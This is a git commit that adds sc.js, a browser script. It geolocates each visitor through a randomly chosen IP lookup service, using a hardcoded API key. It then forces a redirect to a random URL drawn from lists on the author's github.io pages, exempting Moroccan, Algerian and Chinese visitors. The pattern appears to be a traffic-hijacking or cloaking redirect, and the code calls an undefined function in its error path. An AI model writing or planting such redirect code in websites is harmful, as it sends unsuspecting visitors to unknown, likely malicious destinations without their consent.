849b6dbb8f1278471a8ce4e82d428b144fbc7a26
hellonetwork2023 <135538374+hellonetwork2023@users.noreply.github.com>
2023-07-16 20:44:31 +0100

    Create sc.js

---
+++ sc.js
@@ -0,0 +1,80 @@
+const jsonUrls = [
+    'https://ip-api.io/json/',
+    'https://ip.nf/me.json',
+    'https://www.iplocate.io/api/lookup/',
+    'https://api.ipbase.com/v1/json/',
+    'https://ip.nf/me.json',
+    'https://get.geojs.io/v1/ip/country.json',
+    'https://api.ipgeolocation.io/ipgeo?apiKey=ad9029dc02be4b8db892f991c1df9446'
+];
+
+// Fetch country information from a randomly selected JSON URL
+const randomIndex = Math.floor(Math.random() * jsonUrls.length);
+const randomUrl = jsonUrls[randomIndex];
+
+// Fetch country information using a third-party API
+fetch(randomUrl)
+    .then(response => response.json())
+    .then(data => {
+        let countryCode;
+    
+        // Check if the response contains country code
+        if (data.ip.country_code) {
+            countryCode = data.ip.country_code;
+            console.log('country:', countryCode);
+        }
+
+        else if (data.country_code) {
+            countryCode = data.country_code;
+            console.log('country_code:', countryCode);
+        }
+        else if (data.countryCode) {
+            countryCode = data.countryCode;
+            console.log('country_code:', countryCode);
+        }
+        else if (data.country_code2) {
+            countryCode = data.country_code2;
+            console.log('country_code:', countryCode);
+        }
+        // Check if the response contains country
+        else if (data.country) {
+            countryCode = data.country;
+            console.log('country:', countryCode);
+        }
+    
+        // Perform country-based redirection using country code or country
+        performCountryRedirection(countryCode);
+        })
+    .catch(error => {
+        // Handle error if the API request fails
+        console.error('Error:', error);
+        // Redirect to a default page if the country detection fails
+        redirectToRandomUrl();
+        });
+
+// Function to perform country-based redirection
+function performCountryRedirection(countryCode) {
+    if (countryCode === 'GB') {
+        fetchUrls('https://hellonetwork2023.github.io/uk/ukurls.json');
+      } else if (countryCode === 'MA' || countryCode === 'DZ' || countryCode === 'CN') {
+        return;
+      }else {
+        fetchUrls('https://hellonetwork2023.github.io/us/usurls.json');
+      }
+    }
+
+function fetchUrls(jsonFile) {
+    fetch(jsonFile)
+    .then(response => response.json())
+    .then(data => {
+        const urls = data.urls.map(site => site.url);
+        const randomIndex = Math.floor(Math.random() * urls.length);
+        const randomUrl = urls[randomIndex];
+        setTimeout(function () {
+            window.location.href = randomUrl;
+        }, 1000);
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
+}
